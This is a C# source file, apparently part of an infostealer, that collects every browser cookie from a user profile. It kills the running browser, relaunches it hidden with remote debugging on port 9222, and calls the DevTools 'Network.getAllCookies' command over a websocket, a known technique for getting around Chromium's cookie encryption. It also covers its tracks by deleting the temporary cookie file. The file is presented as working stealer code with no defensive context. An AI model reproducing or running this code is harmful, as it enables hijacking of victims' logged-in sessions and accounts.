using System.Text;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Text.RegularExpressions;

namespace v20_decrypt
{
    internal class V20Collect
    {
        private const int DEBUG_PORT = 9222;
        private static readonly string DEBUG_URL = $"http://localhost:{DEBUG_PORT}/json";
        private static readonly string LOCAL_APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);


        public static async Task<CookieFormat[]> GetCookiesFromBrowser(string path, string key)
        {
            try
            {
                string binPath = "";
                var config = PathsCV20.PATHS[key];
                string binPath1 = config["bin1"];
                string binPath2 = config["bin2"];
                string binPath3 = config["bin3"];

                if (File.Exists(binPath1)) binPath = binPath1;
                if (File.Exists(binPath2)) binPath = binPath2;
                if (File.Exists(binPath3)) binPath = binPath3;


                if (binPath == "")
                {
                    return null;
                }

                string userDataPath = path;
                string command = PathsCV20.commandT + $"\"{userDataPath}\"";

                CloseBrowser(binPath);
                StartBrowser(binPath, command);

                string wsUrl = await GetDebugWsUrl();

                CookieFormat[] cookies = await GetCookies(wsUrl);

                CloseBrowser(binPath);

                return cookies;
            }
            catch (Exception ex)
            {
                return null;
            }
        }


        private static string ParseDebugWsUrl(string content)
        {
            string[] lines = content.Split('\n');
            foreach (string line in lines)
            {
                if (line.Contains("webSocketDebuggerUrl"))
                {
                    return line.Replace("webSocketDebuggerUrl", " ").Replace('"', ' ').Trim().Substring(1).Trim();
                }
            }

            return null;
        }

        internal static string GenerateRandomString(int length)
        {
            Random random = new Random();
            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < length; i++)
                result.Append(chars[random.Next(0, chars.Length)]);

            return result.ToString();
        }

        private static async Task<string> GetDebugWsUrl()
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(DEBUG_URL);
                response.EnsureSuccessStatusCode();
                string content = await response.Content.ReadAsStringAsync();
                try
                {
                    string url = ParseDebugWsUrl(content);
                    return url;
                }
                catch { }

                throw new Exception("Could not find 'webSocketDebuggerUrl' in the debug info.");
            }
        }

        private static void CloseBrowser(string binPath)
        {
            string procName = Path.GetFileName(binPath);
            try
            {
                Process[] processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(procName));
                foreach (Process process in processes)
                {
                    process.Kill();
                }
            }
            catch { }
        }

        private static void StartBrowser(string binPath, string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = binPath,
                Arguments = command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process.Start(startInfo);
        }

        private static string ExtractUserAgent(string jsonString)
        {
            string pattern = "\"userAgent\":\"(.*?)\"";
            Regex regex = new Regex(pattern);
            Match match = regex.Match(jsonString);

            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            else
            {
                return null;
            }
        }

        private static async Task<CookieFormat[]> GetCookies(string wsUrl)
        {
            var cookies = new List<CookieFormat>();

            using (ClientWebSocket ws = new ClientWebSocket())
            {
                var tcs = new TaskCompletionSource<object>();
                try
                {
                    await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);

                    string request = @"{""id"": 1, ""method"": ""Network.getAllCookies""}";


                    await SendMessageAsync(ws, request);

                    string responseCookies = await ReceiveMessageAsync(ws);

                    cookies = ParseCookiesFromResponse(responseCookies);

                    tcs.SetResult(null);


                }
                catch (Exception ex)
                {
                    tcs.SetException(ex);
                }
                finally
                {
                    if (ws.State == WebSocketState.Open)
                        await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
                }

                await tcs.Task;
                return cookies.ToArray();
            }
        }

        private static string writteCookieToFile(string response)
        {
            string itogLines = response.Replace(',', '\n');
            string pathCookie = LOCAL_APP_DATA + GenerateRandomString(20);
            File.WriteAllText(pathCookie, itogLines);
            return pathCookie;
        }

        private static string parseValue(string value)
        {
            string itogValue = string.Empty;
            string[] parts = value.Split(':');
            itogValue = parts.Last().Replace('"', ' ').Trim();
            return itogValue;
        }

        private static List<CookieFormat> ParseCookiesFromResponse(string response)
        {
            var cookies = new List<CookieFormat>();

            try
            {
                string cookieFilePath = writteCookieToFile(response);

                string[] lines = File.ReadAllLines(cookieFilePath);


                string nameC = string.Empty;
                string valueC = string.Empty;
                string domainC = string.Empty;
                string pathC = string.Empty;
                string expiryC = string.Empty;

                foreach (string line in lines)
                {
                    if (expiryC != string.Empty)
                    {
                        cookies.Add(new CookieFormat(host: domainC, name: nameC, path: pathC, cookie: valueC, expiry: expiryC));
                        nameC = string.Empty;
                        valueC = string.Empty;
                        domainC = string.Empty;
                        pathC = string.Empty;
                        expiryC = string.Empty;
                    };

                    if (line.Contains("name")) nameC = parseValue(line);
                    if (line.Contains("value")) valueC = parseValue(line);
                    if (line.Contains("domain")) domainC = parseValue(line);
                    if (line.Contains("path")) pathC = parseValue(line);
                    if (line.Contains("expires")) expiryC = parseValue(line);
                }

                File.Delete(cookieFilePath);
                return cookies;
            }
            catch { }

            return null;
        }

        private static async Task SendMessageAsync(ClientWebSocket socket, string message)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(message);
            await socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
        }

        private static async Task<string> ReceiveMessageAsync(ClientWebSocket socket)
        {
            var buffer = new byte[1024 * 4];
            var stringBuilder = new StringBuilder();

            WebSocketReceiveResult result;
            do
            {
                result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                stringBuilder.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
            } while (!result.EndOfMessage);

            return stringBuilder.ToString();
        }
    }
}
